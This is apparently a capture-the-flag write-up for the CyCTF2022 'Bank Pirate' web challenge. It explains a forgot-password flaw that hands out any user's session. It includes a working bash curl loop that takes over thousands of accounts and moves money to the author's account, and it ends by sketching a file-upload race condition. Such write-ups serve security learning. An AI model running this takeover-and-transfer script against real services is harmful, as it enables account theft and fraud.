---
published: true
title: The Bank Pirate - CyCTF2022
date: 2022-11-21 03:28:00 +0200
categories: [CTF]
tags: CTF
---
# Summary :

It's Banking Application, you can receivce and transfer money with your account, to be able to get ViP access you should have 1.000.000$.

# Methodology :

First thing came into my mind that i need to steal some money to get ViP access, The transfer_money function as shown below we have two paramter amount and receiver account but we can’t maipulate the ID to send money from other account to Our account, Because ID is stored in the session.
<img src="https://i.ibb.co/TPf4g1J/Untitled.png" alt="Untitled" border="0">
Most of the web applications us vulnerable to account takeover through Forgot_password Function, So i went to check how this function is working here.
<img src="https://i.ibb.co/xzpQV6W/2022-11-21-12-26-12-Window.png" alt="2022-11-21-12-26-12-Window" border="0">
After Analyzing the function i found that we can takeover any account, The function asks you for the username and then gives you that user’s session before make sure you are that user.

So now i will try to takeover User 2 and transfer money to my account.
<img src="https://i.ibb.co/xjPNSGf/2022-11-18-12-54-42-SB-Admin-2-Forgot-Password-Mozilla-Firefox.png" alt="2022-11-18-12-54-42-SB-Admin-2-Forgot-Password-Mozilla-Firefox" border="0">
Successfully I tookover the account and transfered money to my account.
<img src="https://i.ibb.co/JFv8JKK/2022-11-18-12-55-12-Mozilla-Firefox.png" alt="2022-11-18-12-55-12-Mozilla-Firefox" border="0">
Now i need to autmate this proccess to get 1 million dollar, Basically the script takeover the accounts sequentially and transfer money to my account.
```bash
for i in $(seq 7 6000); do
 curl -i -s -k  -X $'GET' \
    -H $'Host: 3.248.33.115:40017' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Cookie: PHPSESSID=htr5dtksu0fp2i5121sfblfnod' -H $'Connection: close' \
    -b $'PHPSESSID=htr5dtksu0fp2i5121sfblfnod' \
    $'http://3.248.33.115:40017/forgot-password.php?username='$i
 curl -i -s -k  -X $'GET' \
    -H $'Host: 3.248.33.115:40017' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Cookie: PHPSESSID=htr5dtksu0fp2i5121sfblfnod' -H $'Connection: close' \
    -b $'PHPSESSID=htr5dtksu0fp2i5121sfblfnod' \
    $'http://3.248.33.115:40017/transfere.php?receiver_account=6015&amount=1000' 
done
```
After Waiting some time, Now i have ViP account.
<img src="https://i.ibb.co/5r6p3tH/2022-11-18-16-16-30-The-Pirate-Bank-Dashboard-Mozilla-Firefox.png" alt="2022-11-18-16-16-30-The-Pirate-Bank-Dashboard-Mozilla-Firefox" border="0">
Now we can upload a file with a complaint becase we are ViP and you need to listen.
<img src="https://i.ibb.co/1qN2hJ7/Alec.gif" alt="Alec" border="0">

Let’s analyze how the complaint function works and see how we can abuse the upload function.
<img src="https://i.ibb.co/ZMtf22B/upload.png" alt="upload" border="0">
We can only upload PNG,JPEG and the location for the uploaded file will be randomly generated by syper_random function O.o, Let’s see how random is that.
<img src="https://i.ibb.co/ncTbsYR/2022-11-21-12-38-48-Window.png" alt="2022-11-21-12-38-48-Window" border="0">
Yeah, It's super random.
<img src="https://i.ibb.co/bQKr0x1/giphy-29.gif" alt="giphy-29" border="0">

<img src="https://i.ibb.co/TWKhTny/2022-11-18-16-19-00-b6589fc6ab0dc82cf12099d1c2d40ab994e8410c-png-PNG-Image-900-876-pixels-Moz.png" alt="2022-11-18-16-19-00-b6589fc6ab0dc82cf12099d1c2d40ab994e8410c-png-PNG-Image-900-876-pixels-Moz" border="0">

The Last part of the challenge is similar to that challenge <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">RACE-CONDITION</a>
As you see it's the same steps to be vulnerable ^_^.
<img src="https://i.ibb.co/M7bnqmT/RACE-Condition.png" alt="RACE-Condition" border="0">
After we upload a file it's temporary moved to the disk, So we can use Race condition to execute the file we upload on the disk to get the flag.
